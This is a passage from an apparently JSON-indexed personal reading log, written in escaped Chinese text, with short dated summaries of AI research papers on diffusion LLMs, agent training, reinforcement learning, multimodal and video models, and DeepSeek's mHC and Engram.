Diffusion Large Language Models<ul> <li>Diffusion LLM\u7684\u4e00\u79cd\u52a8\u6001\u8c03\u6574\u751f\u6210\u957f\u5ea6\u7684\u65b9\u6848\uff0c\u901a\u8fc7\u8ba1\u7b97\u6700\u540e\u4e00\u4e2atoken\u751f\u6210EOS\u7684\u7f6e\u4fe1\u5ea6\uff0c\u6765\u5224\u65ad\u662f\u5426\u8981\u8c03\u6574\u751f\u6210\u957f\u5ea6</li> </ul> </li> <li>https://n8nchat.com/<ul> <li>n8n\u7684AI\u8f85\u52a9\u5de5\u5177\uff0c\u7528\u6765\u5feb\u901f\u5730\u67e5\u8be2\u8282\u70b9\u529f\u80fd\u548c\u53c2\u6570</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-8/#87","title":"8.7","text":"<ul> <li>https://arxiv.org/abs/2508.03680<ul> <li>\u5fae\u8f6f\u5f00\u53d1\u7684\u4e00\u4e2aagent\u8bad\u7ec3\u6846\u67b6\uff0c\u5c06agent\u6267\u884c\u548c\u8bad\u7ec3\u89e3\u8026\u5f00\uff0c\u53ef\u4ee5\u5728\u51e0\u4e4e\u4e0d\u5f71\u54cd\u539f\u6709agent\u4ee3\u7801\u7684\u60c5\u51b5\u4e0b\u5bf9\u4e8eagent\u8fdb\u884c\u8bad\u7ec3\uff0c\u56e0\u6b64\u4e5f\u5929\u7136\u9002\u914dLangChain\u7b49\u5927\u91cfagent\u6846\u67b6\uff0c\u5176\u81ea\u79f0\u662fAny Framework</li> </ul> </li> <li>[2508.02193] Seed Diffusion: A Large-Scale Diffusion Language Model with High-Speed Inference<ul> <li>\u5b57\u8282\u5f00\u53d1\u7684Diffusion LLM\uff0c\u76ee\u6807\u4fa7\u91cd\u4ee3\u7801\u751f\u6210\uff0c\u4ee5\u53ca\u751f\u6210\u7684\u901f\u5ea6\u63d0\u5347</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-8/#88","title":"8.8","text":"<ul> <li>https://github.com/google/langextract<ul> <li>\u8fd9\u662fGoogle\u5f00\u53d1\u7684\u4e00\u4e2a\u7528\u4e8e\u505a\u6587\u672c\u4fe1\u606f\u63d0\u53d6\u7684\uff0c\u4ece\u5927\u89c4\u6a21\u6587\u672c\u4e2d\u63d0\u53d6\u7ed3\u6784\u5316\u6570\u636e\uff0c\u5f00\u6e90\uff0c\u5176\u6548\u679c\u7c7b\u4f3c\u4e00\u4e2a\u5b8c\u6574\u7684Rag\u4ea7\u54c1</li> </ul> </li> <li>[2508.04604v1] TURA: Tool-Augmented Unified Retrieval Agent for AI Search<ul> <li>\u5173\u4e8eTool Search\u7684\u4e00\u4e2a\u89e3\u51b3\u65b9\u6848\uff0c\u8f83\u4e3a\u590d\u6742</li> </ul> </li> <li>[2508.03923] CoAct-1: Computer-using Agents with Coding as Actions<ul> <li>\u5173\u4e8eComputer-use\uff0c\u9664\u4e86GUI\u65b9\u6848\u4e4b\u5916\u8fd8\u505a\u4e86\u7f16\u7a0b\u5de5\u5177\uff0c\u4f1a\u5c06\u4efb\u52a1\u5206\u914d\u5bfc\u4ee3\u7801agent\u548cGUI agent\u4e0a\uff0c\u66f4\u597d\u5730\u5b9e\u73b0Browser use</li> </ul> </li> <li>[2508.03012] Tool-integrated Reinforcement Learning for Repo Deep Search<ul> <li>\u5b57\u8282\u7684\u4e00\u7bc7\u5173\u4e8e\u4ee3\u7801\u5e93\u95ee\u9898\u5b9a\u4f4d\u7684\u5de5\u4f5c\uff0c\u7528\u4e86\u5fae\u8c03\u548cRL\uff0c\u5e76\u4e14\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6570\u636e\u96c6\uff0c\u662f\u6765\u81eaGithub\u4ed3\u5e93+Issues\uff0c\u968f\u540e\u662f\u4eba\u5de5\u7b5b\u9009\u4e4b\u540e\u7684\u7ed3\u679c</li> <li>\u62d2\u7edd\u91c7\u6837\u5fae\u8c03\uff1a\u662f\u6307\u5728\u6a21\u578b\u4e0a\u505a\u67d0\u4e2a\u4efb\u52a1\uff0c\u53bb\u6389\u5176\u4e2d\u5931\u8d25\u7684\u8f68\u8ff9\uff0c\u4f7f\u7528\u6210\u529f\u7684\u6b21\u6570\u8fdb\u884c\u5fae\u8c03\u7684\u65b9\u6848</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-8/#812","title":"8.12","text":"<ul> <li>[2508.05629] On the Generalization of SFT: A Reinforcement Learning Perspective with Reward Rectification<ul> <li>DFT\uff0c\u52a8\u6001\u8c03\u6574SFT\u7684\u68af\u5ea6\u53cd\u9988\uff0c\u4f7f\u5176\u53ef\u4ee5\u8fbe\u5230RL\u7684\u6cdb\u5316\u6027</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-8/#814","title":"8.14","text":"<ul> <li>[2508.08221] Part I: Tricks or Traps? A Deep Dive into RL for LLM Reasoning<ul> <li>\u5173\u4e8eRL\u7684\u5404\u79cdconfig\u505a\u4e86\u5f88\u591a\u7684\u6d88\u878d\u5b9e\u9a8c\uff0c\u4e00\u7bc7\u6bd4\u8f83\u597d\u7684\u7efc\u8ff0\u6765\u5224\u65ad\u5982\u4f55\u5728RL\u4e2d\u9009\u62e9\u5408\u9002\u7684\u914d\u7f6e</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-8/#822","title":"8.22","text":"<ul> <li>[2508.14704] MCP-Universe: Benchmarking Large Language Models with Real-World Model Context Protocol Servers<ul> <li>\u5173\u4e8eLLM\u4f7f\u7528MCP\u7684\u4e00\u4e2aBenchmark\uff0c\u8bbe\u8ba1\u4e86\u5341\u51e0\u4e2a\u4e0d\u540c\u9886\u57df\u7684MCP\uff0c\u89c2\u5bdfLLM\u8c03\u7528\u7684\u80fd\u529b</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-9/","title":"2025 9","text":""},{"location":"reading/dailyreading/2025-9/#91","title":"9.1","text":"<ul> <li>[2508.21038] On the Theoretical Limitations of Embedding-Based Retrieval<ul> <li>Google\u7684\u4e00\u7bc7\u5173\u4e8e\u5355\u5411\u91cfrag\u7684\u7406\u8bba\u5206\u6790\uff0c\u8868\u660e\u4e86\u5355\u5411\u91cf\u7684embedding\u68c0\u7d22\u662f\u5b58\u5728\u7406\u8bba\u4e0a\u9650\u7684</li> </ul> </li> <li>\u79d1\u666e\u5411\uff1a\u4e00\u6587\u89e3\u6784\u5927\u6a21\u578b\u540e\u8bad\u7ec3\uff0cGRPO\u548c\u5b83\u7684\u7ee7\u4efb\u8005\u4eec\u7684\u524d\u4e16\u4eca\u751f<ul> <li>GRPO\u7684\u540e\u7ee7\u8005\u7684\u7b80\u5355\u603b\u7ed3</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-9/#922","title":"9.22","text":"<ul> <li>[2509.13311] Towards General Agentic Intelligence via Environment Scaling<ul> <li>\u6784\u5efa\u4e00\u4e2a\u53ef\u6269\u5c55\u7684\u73af\u5883\uff0c\u7b97\u662fToolBench\u90a3\u4e2a\u5de5\u5177\u96c6\u7684\u6269\u5145\u7248\u672c</li> </ul> </li> <li>[2509.13310] Scaling Agents via Continual Pre-training<ul> <li>\u5c06Agent\u80fd\u529b\u4f5c\u4e3a\u9884\u8bad\u7ec3\u7684\u4e00\u90e8\u5206</li> </ul> </li> <li>[2509.15207] FlowRL: Matching Reward Distributions for LLM Reasoning<ul> <li>\u57fa\u4e8eFlow\u7684\u8303\u5f0f\uff0c\u4fee\u6539\u5956\u52b1\u7684\u83b7\u53d6\uff0c\u76f8\u6bd4\u4e8e\u6700\u5927\u5316\u5956\u52b1\u5e94\u8be5\u66f4\u52a0\u62df\u5408\u5956\u52b1\u7684\u5206\u5e03\uff0c\u6700\u91cd\u8981\u662f\u9f13\u52b1\u751f\u6210\u7684\u591a\u6837\u6027\uff0c\u800c\u4e0d\u662f\u574d\u7f29\u5230\u4e00\u4e2a\u70b9</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-9/#923","title":"9.23","text":"<p>\u4e0b\u9762\u8fd9\u6bb5\u8282\u9009\u81ea\u82f9\u679c\u7684\u4e00\u7bc7\u591a\u6a21\u6001\u5927\u6a21\u578b\u7684\u8bba\u6587\uff0c\u4ecb\u7ecd\u4e86\u73b0\u9636\u6bb5\u4e3b\u6d41\u7684MLLM\u7684\u5f62\u5f0f</p> <ol> <li> <p>\u7eaf\u7406\u89e3\u578b\u591a\u6a21\u6001LLM\uff08MLLMs for Image Understanding\uff09</p> <ul> <li>\u5178\u578b\u67b6\u6784\uff1a\u51bb\u7ed3\u89c6\u89c9\u7f16\u7801\u5668 + \u8f7b\u91cf\u8fde\u63a5\u5668 + \u5927\u8bed\u8a00\u6a21\u578b<ul> <li>Flamingo\uff08\u4ea4\u53c9\u6ce8\u610f\u529b\u6ce8\u5165\uff09</li> <li>BLIP-2\uff08Q-Former\u5bf9\u9f50\uff09</li> <li>LLaVA\u3001MM1\u3001InternVL\u3001Qwen-VL \u7cfb\u5217\uff08MLP \u6295\u5f71\uff0c\u89c4\u6a21\u5316\u6570\u636e\u4e0e\u6a21\u578b\uff09</li> </ul> </li> <li>\u5171\u540c\u5c40\u9650\uff1a\u4ec5\u652f\u6301\u56fe\u50cf\u2192\u6587\u672c\u7406\u89e3\uff0c\u4e0d\u5177\u5907\u539f\u751f\u56fe\u50cf\u751f\u6210\u80fd\u529b\u3002</li> </ul> </li> <li> <p>\u7edf\u4e00\u591a\u6a21\u6001\u6a21\u578b\uff08Unified Multimodal Models\uff09\u00a0\u6309\u67b6\u6784\u8303\u5f0f\u7ec6\u5206\u4e09\u7c7b\uff1a</p> <ul> <li>\u7edf\u4e00\u81ea\u56de\u5f52\uff08AR\uff09\u5c06\u56fe\u50cf\u8f6c\u4e3a\u79bb\u6563/\u8fde\u7eed token \u5e8f\u5217\uff0c\u4e0e\u6587\u672c\u4e00\u8d77\u81ea\u56de\u5f52\u5efa\u6a21\u3002\u4ee3\u8868\uff1aChameleon\u3001Emu3\u3001Janus\u3001Bagel\u3001X-Omni \u7b49\u3002</li> <li>\u51bb\u7ed3 LLM + \u5916\u63a5\u6269\u6563\u89e3\u7801\u5668\uff08Decoupled LLM-Diffusion\uff09LLM \u4ec5\u8d1f\u8d23\u8bed\u4e49\uff0c\u751f\u6210\u4ea4\u7ed9\u72ec\u7acb\u6269\u6563\u6a21\u578b\u3002\u4ee3\u8868\uff1aQwen-Image\u3001OmniGen2\u3001MetaQuery \u7b49\u3002</li> <li>\u6df7\u5408 AR-\u6269\u6563\uff08Hybrid AR-Diffusion\uff09\u5728\u540c\u4e00 Transformer \u5185\u4ea4\u66ff\u6267\u884c next-token \u9884\u6d4b\u4e0e\u6269\u6563\u53bb\u566a\u3002\u4ee3\u8868\uff1aTransfusion\u3001TRIM \u7b49\u3002</li> </ul> <p>Manzano \u4e0e\u7b2c\u4e00\u7c7b\u6700\u76f8\u8fd1\uff0c\u4f46\u5173\u952e\u533a\u522b\u662f\u63d0\u51fa\u5355\u4e00\u89c6\u89c9\u7f16\u7801\u5668 + \u53cc\u8f7b\u91cf\u9002\u914d\u5668\u7684\u6df7\u5408 tokenizer\uff0c\u907f\u514d\u5f02\u6784 token \u540c\u4ed3\u8f93\u5165\uff0c\u7f13\u89e3\u4efb\u52a1\u51b2\u7a81\u3002</p> </li> <li> <p>\u6269\u6563\u5f0f\u56fe\u50cf\u751f\u6210\u6a21\u578b\uff08Diffusion Models for Image Generation\uff09</p> <ul> <li>\u57fa\u7840\uff1aDDPM\u3001Score-SDE</li> <li>\u6f5c\u7a7a\u95f4\u52a0\u901f\uff1aLDM / Stable Diffusion \u7cfb\u5217</li> <li>\u6d41\u5339\u914d\uff08Flow-Matching\uff09\u4e0e DiT \u67b6\u6784\uff1aPixArt-\u03b1\u3001SD3\u3001Flux\u3001DiT-Air \u7b49Manzano \u7684\u56fe\u50cf\u89e3\u7801\u5668\u5373\u91c7\u7528\u6f5c\u7a7a\u95f4 Flow-Matching + DiT-Air\uff0c\u5e76\u4ee5 LLM \u8f93\u51fa\u7684\u79bb\u6563\u89c6\u89c9 token \u4f5c\u4e3a\u6761\u4ef6\uff0c\u800c\u975e\u4f20\u7edf\u6587\u672c\u7f16\u7801\u5668\u3002</li> </ul> </li> <li> <p>[2509.16127] BaseReward: A Strong Baseline for Multimodal Reward Model</p> <ul> <li>\u7edf\u4e00\u7684\u8f83\u5927\u7684reward model</li> </ul> </li> <li>[2509.16197] MANZANO: A Simple and Scalable Unified Multimodal Model with a Hybrid Vision Tokenizer<ul> <li>\u82f9\u679c\u6700\u65b0\u7684MLLM\uff0c\u91cc\u9762\u6709\u4e00\u4e9b\u8f83\u65b0\u7684\u7efc\u8ff0</li> </ul> </li> </ol>"},{"location":"reading/dailyreading/2026-1/","title":"2026 1","text":""},{"location":"reading/dailyreading/2026-1/#11","title":"1.1","text":"<ul> <li>Video Models are Zero-Shot reasoner and learner<ul> <li>Google Veo3 \u7684\u8bba\u6587\uff0c\u5c55\u793a\u4e86Veo3\u5728\u7ecf\u8fc7\u5927\u89c4\u6a21\u8bad\u7ec3\u4e4b\u540e\u6d8c\u73b0\u51fa\u6765\u7684Zero shot\u7684\u80fd\u529b\uff0c\u80fd\u591f\u5b8c\u6210\u8bad\u7ec3\u6570\u636e\u4ee5\u5916\u7684\u5404\u79cd\u4efb\u52a1\uff0c\u5c55\u73b0\u4e86\u60ca\u4eba\u7684\u6d8c\u73b0\u80fd\u529b</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-1/#12","title":"1.2","text":"<ul> <li>mHC https://arxiv.org/abs/2512.24880<ul> <li>DeepSeek\u7684\u8bba\u6587\uff0c\u5bf9\u4e8e\u6b8b\u5dee\u6d41\u8fdb\u884c\u4e86\u4fee\u6539\uff0c\u5c06\u6052\u5b9a\u4e3a1\u7684\u6b8b\u5dee\u6d41\u8f6c\u6362\u6210\u4e00\u4e2a\u53ef\u5b66\u4e60\u7684\u76ee\u6807\uff0c\u5e76\u4e14\u5c06\u5176\u8fdb\u884cManifold-Constrained\u9632\u6b62\u6b8b\u5dee\u6d41\u53d8\u5f97\u8fc7\u5927</li> </ul> </li> <li>Evaluating Parameter Efficient Methods for RLVR<ul> <li>\u5bf9\u4e8eRLVR\u4efb\u52a1\u4e2d\u9ad8\u6548\u53c2\u6570\u5fae\u8c03\u65b9\u6848\u7684\u4e00\u4e2a\u5206\u6790\u5b9e\u9a8c\uff0c\u5305\u62ecLora\uff0cDoRA\u3001AdaLoRA\u7b49\u53d8\u4f53</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-1/#14","title":"1.4","text":"<ul> <li>JavisGPT <ul> <li>\u97f3\u89c6\u9891\u7f16\u8f91\u7684\u6a21\u578b\uff0c\u901a\u8fc7\u4e00\u4e2aQwenVL+Dit\u62fc\u63a5\u7684\u67b6\u6784\uff0c\u5b8c\u6210\u4e86\u591a\u6a21\u6001\u7684\u7406\u89e3\u548c\u751f\u6210\uff0c\u5305\u62ec\u7f16\u8f91\uff0c\u5e76\u4e14\u7740\u91cd\u4f18\u5316\u4e86\u97f3\u89c6\u9891\u534f\u540c\u7684\u5185\u5bb9</li> <li>\u8f93\u5165\u5305\u62ecvideo\u7684\u8f93\u5165\uff0c\u97f3\u9891\u7684\u8f93\u5165\uff0c\u6587\u672c\u63d0\u793a\u8bcd\u3002\u57fa\u4e8eQwenVL\uff0c\u7136\u540e\u9002\u914d\u4e86\u4e00\u4e2aLora\u6765\u8fdb\u884c\u5fae\u8c03\u3002\u6700\u540eLLM\u4f1a\u5c06\u8f93\u51fa\u7ed9\u4e00\u4e2aDit\uff0c\u8ba9\u5176\u8f93\u51fa\u7f16\u8f91\u597d\u7684\u89c6\u9891\u97f3\u9891\u5185\u5bb9</li> </ul> </li> </ul> <p>\u751f\u6210\u548c\u7406\u89e3\u662f\u5426\u9700\u8981\u7eb3\u5165\u5728\u7edf\u4e00\u7684\u6846\u67b6\u4e2d\uff0c\u73b0\u6709\u7684\u65b9\u6848\u4f3c\u4e4e\u4ecd\u7136\u6ca1\u6709\u6307\u51fa\u4e00\u6761\u660e\u786e\u7684\u8def\u5f84\u3002\u4ecenano-banana\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u4f3c\u4e4e\u76ee\u524d\u6700\u597d\u7684\u65b9\u6848\u8fd8\u662f\u8ba9\u751f\u6210\u7406\u89e3\u8fdb\u884c\u5206\u79bb\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u7cfb\u7edf\u8fdb\u884c\u5904\u7406</p> <ul> <li>https://arxiv.org/pdf/2512.24873 Agent Learning EcoSystem<ul> <li>\u662f\u963f\u91cc\u56e2\u961f\u505a\u4e00\u4e2a\u5b8c\u6574\u4e14\u7cfb\u7edf\u7684Agent\u5b66\u4e60\u6846\u67b6\uff0c\u5c06\u963f\u91cc\u4e4b\u524d\u505a\u7684\u5f88\u591aAgent\u76f8\u5173\u7684\u5de5\u4f5c\u4e32\u4e86\u8d77\u6765\uff0c\u5e76\u4e14\u81f4\u529b\u4e8e\u89e3\u51b3\u8bad\u63a8\u4e0d\u4e00\u81f4\uff0c\u529b\u56fe\u6784\u5efa\u8db3\u591fStrong\u7684Agent RL baseline</li> <li>ROLL\uff1a\u652f\u6301\u5f02\u6b65 rollout-\u8bad\u7ec3\u89e3\u8026\u3001\u52a8\u6001 GPU \u5206\u65f6\u590d\u7528\u3001chunk \u7ea7\u4fe1\u7528\u5206\u914d\u7684 RL \u8bad\u7ec3\u6846\u67b6\u3002\u8bad\u7ec3\u6846\u67b6</li> <li>ROCK\uff1a\u4e07\u7ea7\u5e76\u53d1\u3001\u5b89\u5168\u9694\u79bb\u3001GEM API \u517c\u5bb9\u7684\u6c99\u7bb1\u73af\u5883\u5f15\u64ce\uff0c\u5b9e\u73b0\u8f68\u8ff9\u91c7\u96c6\u4e0e\u8fd0\u884c\u65f6\u9a8c\u8bc1\u3002\u6838\u5fc3\u662f\u6c99\u76d2</li> <li>iFlow CLI\uff1a\u7edf\u4e00\u4e0a\u4e0b\u6587\u7ba1\u7406\u3001\u53ef\u914d\u7f6e\u5de5\u4f5c\u6d41\u7684\u4ee3\u7406\u6846\u67b6\uff0c\u4fdd\u8bc1\u201c\u8bad\u7ec3-\u90e8\u7f72\u201d\u96f6\u5dee\u5f02\u3002\u6838\u5fc3\u662f\u4e0a\u4e0b\u6587\u7ba1\u7406</li> </ul> </li> </ul> <p></p> <ul> <li>Recursive Language Model<ul> <li>\u8fd9\u7bc7\u8bba\u6587\u4e3b\u8981\u9488\u5bf9\u7684\u662f\u8d85\u957f\u4e0a\u4e0b\u6587\u7684\u95ee\u9898\uff0c\u5176\u8ba9LLM\u5c06\u4e0a\u4e0b\u6587\u4f5c\u4e3a\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u53bb\u5904\u7406\uff0c\u800c\u4e0d\u662f\u6bcf\u6b21\u90fd\u4e00\u80a1\u8111\u5730\u628a\u6240\u6709\u4e0a\u4e0b\u6587\u90fd\u585e\u8fdb\u6a21\u578b\u4e2d</li> <li>\u8ba9\u6a21\u578b\u81ea\u5df1\u7f16\u5199Python\u4ee3\u7801\u6765\u62c6\u89e3\u4e0a\u4e0b\u6587\u548c\u8c03\u7528\u81ea\u5df1\uff0c\u6765\u5b9e\u73b0\u4e0a\u4e0b\u6587\u7684\u9ad8\u6548\u5904\u7406</li> </ul> </li> </ul> <p></p>"},{"location":"reading/dailyreading/2026-1/#18","title":"1.8","text":"<ul> <li>https://nitrogen.minedojo.org/<ul> <li>nvidia\u7684\u5de5\u4f5c\uff0c\u6536\u96c6\u4e86\u8d85\u8fc740000+h\u6e38\u620f\u89c6\u9891\uff0c\u8986\u76d6\u8d85\u8fc71000\u6b3e\u6e38\u620f\uff0c\u5e76\u4e14\u63d0\u53d6\u4e86\u52a8\u4f5c\u7247\u6bb5\u8fd8\u8fdb\u884c\u4e86\u6253\u6807\uff0c\u7528\u8fd9\u4e9b\u6570\u636e\u8bad\u7ec3\u4e00\u4e2a\u6e38\u620fAgent</li> </ul> </li> </ul> <ul> <li>Loza<ul> <li>\u7f8e\u56e2\u5f00\u53d1\u7684\u7a00\u758f\u6ce8\u610f\u529b\u673a\u5236\uff0c\u57fa\u4e8eMLA\uff0c\u5c06\u6807\u51c6\u7684MLA\u62c6\u6210\u4e24\u90e8\u5206\uff0c\u5168\u91cfMLA+SSA\uff08Stream Sparse Attention\uff09</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-1/#19","title":"1.9","text":"<ul> <li>NextFlow<ul> <li>\u7528Next Scale Prediction\u6765\u505a\u751f\u6210\u7406\u89e3\u7edf\u4e00\u6a21\u578b</li> </ul> </li> <li>SemanticGen<ul> <li>\u4f7f\u7528\u4e24\u9636\u6bb5\u7684\u751f\u6210\u65b9\u6848\uff0c\u5148\u751f\u6210High-Level\u7684\u8bed\u4e49\u8868\u5f81\uff0c\u518d\u5728VAE\u7684\u7a7a\u95f4\u4e2d\u751f\u6210\u7ec6\u7c92\u5ea6\u7684\u7eb9\u7406\u7ed3\u6784\uff0c\u5f53\u7136\u4e0e\u6b64\u76f8\u5bf9\u7684\uff0c\u8bad\u7ec3\u4e5f\u8981\u8bad\u7ec3\u4e24\u90e8\u5206\uff0cSemantic Generator\u548cVAE Latent Generator</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-1/#112","title":"1.12","text":"<p>Sida Peng\u8001\u5e08\u6574\u7406\u76842025\u5e74\u5173\u4e8eVideo World Model\u7684\u76f8\u5173\u8bba\u6587\uff0c\u53ef\u4ee5\u501f\u8fd9\u5f20\u56fe\u6765\u67e5\u6f0f\u8865\u7f3a</p> <ul> <li>VideoAuto-R1 <ul> <li>\u5173\u4e8eVideo Understanding\u505aRL\u7684\u8bba\u6587\uff0c\u7528\u4e24\u9636\u6bb5\u7684\u8f93\u51fa\u65b9\u6848\uff0c\u9996\u5148\u8ba9\u5176\u76f4\u63a5\u8f93\u51fa\u7b54\u6848\uff0c\u6839\u636e\u7b54\u6848\u7684\u7f6e\u4fe1\u5ea6\u518d\u5224\u65ad\u8981\u4e0d\u8981\u8fdb\u884cCot</li> </ul> </li> <li>MIMO-v2-Flash<ul> <li>\u5c0f\u7c73\u7684flash\u6a21\u578b\u7684\u6280\u672f\u62a5\u544a\uff0c\u5728\u67b6\u6784\u4e0a\uff0c\u548c\u5f88\u591a\u65b0\u7684\u6a21\u578b\u4e00\u6837\u91c7\u7528\u4e86\u6df7\u5408\u67b6\u6784\uff0c\u5b83\u91c7\u7528\u4e86\u6ed1\u52a8\u7a97\u53e3+Global Attention\u7684\u6df7\u5408\u67b6\u6784</li> <li>\u5728\u6ed1\u52a8\u7a97\u53e3\u4e2d\u5f15\u5165\u4e86\u53ef\u5b66\u4e60\u7684Attention Sink Bias\uff0c\u5728softmax\u7684\u5206\u6bcd\u91cc\u589e\u52a0\u4e00\u4e2a\u53ef\u5b66\u4e60\u7684\u9879\uff0c\u5728\u6a21\u578b\u4e0d\u9700\u8981\u5173\u6ce8\u5f53\u524d\u7a97\u53e3\u5185Token\u7684\u673a\u4f1a\uff0c\u5c06\u6ce8\u610f\u529b\u5206\u914d\u7ed9\u865a\u62df\u7684Sink</li> <li>\u6ed1\u52a8\u7a97\u53e3\u5927\u5c0f\u4ec5\u6709128 token\uff0c\u5728\u6d88\u878d\u5b9e\u9a8c\u4e2d\u6548\u679c\u6bd4512 token\u597d</li> <li>\u5f15\u5165\u4e86SD\u505aMTP</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-1/#113","title":"1.13","text":"<ul> <li>Plenoptic Video Generation<ul> <li>\u8fd9\u7bc7\u6587\u7ae0\u505a\u7684\u662f\u591a\u89c6\u89d2\u7684Camera Control\uff0c\u6838\u5fc3\u8d21\u732e\u662f\u5728\u89e3\u51b3\u957f\u65f6\u8bb0\u5fc6\u7684\u4e00\u81f4\u6027\uff0c\u5728\u4e0d\u65ad\u7684\u955c\u5934\u53d8\u5316\u4e4b\u540e\uff0c\u751f\u6210\u7684\u89c6\u9891\u8fd8\u80fd\u4fdd\u6301\u4e00\u81f4\u6027\uff0c\u6bd4\u5982\u5728\u89c6\u89d2\u8f6c\u4e00\u5708\u4e4b\u540e\uff0c\u56de\u6765\u770b\u5230\u7684\u8fd8\u662f\u4e00\u6837\u7684\u573a\u666f</li> <li>\u591a\u89c6\u89d2\u7684re-render\u6bd4\u5355\u89c6\u89d2\u7684\u66f4\u52a0\u56f0\u96be\uff0c\u591a\u89c6\u89d2\u4e00\u6b21\u6027\u6e32\u67d3\u591a\u4e2a\u89c6\u89d2\u7684\u89c6\u9891\uff0c\u8981\u6c42\u4fdd\u8bc1\u8fd9\u51e0\u4e2a\u89c6\u9891\u4e4b\u95f4\u80fd\u591f\u4fdd\u8bc1\u8db3\u591f\u7684\u4e00\u81f4\u6027\u3002\u8be5\u8bba\u6587\u89e3\u51b3\u7684\u4efb\u52a1\u4e2d\uff0c\u5b9a\u4e49\u4e3a\u8f93\u5165video+\u591a\u4e2a\u76f8\u673a\u8f68\u8ff9\uff0c\u8f93\u51fa\u591a\u4e2a\u76f8\u673a\u8f68\u8ff9\u5bf9\u5e94\u7684video</li> <li>\u89e3\u51b3\u957f\u65f6\u8bb0\u5fc6\u7684\u4e00\u81f4\u6027\u7684\u6838\u5fc3\u662f\u7ed9Dit\u7684\u6ce8\u5165\u6761\u4ef6<ul> <li>\u6700Native\u7684\u65b9\u6848\uff0c\u5c06\u6240\u6709\u7684\u89c6\u9891\u90fd\u585e\u8fdb\u53bb\uff0c\u4f46\u662f\u65e0\u7591\u662f\u6781\u5927\u7684\u5f00\u9500\uff0c\u5c24\u5176\u662f\u9ad8\u5206\u8fa8\u7387\u89c6\u9891\u7684\u573a\u666f\u4e0b</li> <li>\u7528Block-Diffusion\u7684\u65b9\u5f0f\uff0c\u653e\u5f03\u4e00\u6b21\u751f\u6210\u591a\u89c6\u89d2\u7684\u89c6\u9891\uff0c\u800c\u662f\u6309\u7167\u81ea\u56de\u5f52\u7684\u65b9\u6848\u4e00\u4e2a\u4e2a\u751f\u6210\uff0c\u5728\u9010\u4e2a\u751f\u6210\u7684\u65f6\u5019\uff0c\u4e0d\u53ef\u907f\u514d\u7684\u4e0a\u4e0b\u6587\u4e5f\u4f1a\u8d8a\u6765\u8d8a\u957f\uff0c\u56e0\u6b64\u5c31\u8981\u505a\u68c0\u7d22\u751f\u6210\uff0c\u8fd9\u7bc7\u6587\u7ae0\u57fa\u4e8e3D Fov\u6765\u505a\u68c0\u7d22\u751f\u6210\uff0c\u4e0a\u4e0b\u6587\u4e2d\u53ea\u585e\u5165\u548c\u5f53\u524d\u89c6\u89d2\u76f8\u5173\u7684\u89c6\u9891\u4e0a\u4e0b\u6587\u3002\u6bd4\u5982\u6211\u4eec\u67d0\u4e2a\u89c6\u89d2\u8981\u770b\u623f\u5b50\u7684\u80cc\u9762\uff0c\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u5176\u4ed6\u540c\u6837\u4f1a\u5212\u8fc7\u623f\u5b50\u80cc\u9762\u7684\u89c6\u89d2</li> </ul> </li> </ul> </li> </ul> <ul> <li>Video Deep Research<ul> <li>\u4f7f\u7528Deep Research\u4ee5\u53ca\u4e00\u7cfb\u5217\u7684\u5de5\u5177\uff0c\u6765\u505aVideo Understanding\u7684\u589e\u5f3a\uff08\u5176\u5b9e\u611f\u89c9\u4e0d\u662f\u5f88make sense\uff0c\u4e5f\u5c31\u662f\u8865\u8db3\u4e00\u4e9b\u4e16\u754c\u77e5\u8bc6\u548c\u4e00\u4e9b\u65f6\u6548\u6027\u7684\u573a\u666f\u4f1a\u6709\u6548</li> </ul> </li> <li>BabyVision<ul> <li>\u505a\u4e86\u4e00\u4e2aBenchmark\u6765\u8bc4\u6d4bVLM\u7684\u80fd\u529b\u548c\u5a74\u5e7c\u513f\u7684\u89c6\u89c9\u80fd\u529b\u7684\u5dee\u5f02\uff0c\u5728\u8fd9\u4e2a\u6d4b\u8bc4\u96c6\u5408\u4e2d\u6700\u5f3a\u5927\u7684VLM\u7684\u80fd\u529b\u4e5f\u4e0d\u59826\u5c81\u7684\u513f\u7ae5</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-1/#114","title":"1.14","text":"<ul> <li>Engram<ul> <li>DeepSeek\u7684\u65b0\u8bba\u6587\uff0c\u5bf9Transformer\u67b6\u6784\u8fdb\u884c\u4e86\u4fee\u6539\uff0c\u65b0\u589e\u4e86\u4e00\u79cd\u6761\u4ef6\u8bb0\u5fc6\u673a\u5236\u79f0\u4e3aEngram\uff0c\u7814\u7a76\u8005\u8ba4\u4e3aTransformer\u67b6\u6784\u4e2d\u7f3a\u5c11\u539f\u751f\u7684\u67e5\u627e\u6a21\u5757\uff0c\u88ab\u8feb\u4f7f\u7528\u8ba1\u7b97\u6765\u6a21\u62df\u68c0\u7d22\u673a\u5236</li> <li>\u68c0\u7d22\u6a21\u5757\u91c7\u7528\u73b0\u4ee3\u7684N-gram\u6a21\u5757\uff0c\u5c06\u90e8\u5206MOE\u66ff\u6362\u4e3aEngram\u5185\u5b58\uff0c\u53ef\u4ee5\u8fbe\u5230\u4e00\u4e2a\u6743\u8861\uff0c\u5e76\u4e14\u5728\u957f\u4e0a\u4e0b\u6587\u4efb\u52a1\u4e0a\u6709\u5f88\u5927\u7684\u63d0\u5347</li> <li>Engram\u7684\u6a21\u5757\u7684\u529f\u80fd\u5305\u62ec\u68c0\u7d22+\u878d\u5408\u4e24\u4e2a\u90e8\u5206\uff0c\u7ecf\u8fc7\u538b\u7f29\u7684\u5206\u8bcd\u5668\u4e4b\u540e\uff0c\u901a\u8fc7\u4e00\u4e2aMulti-Head 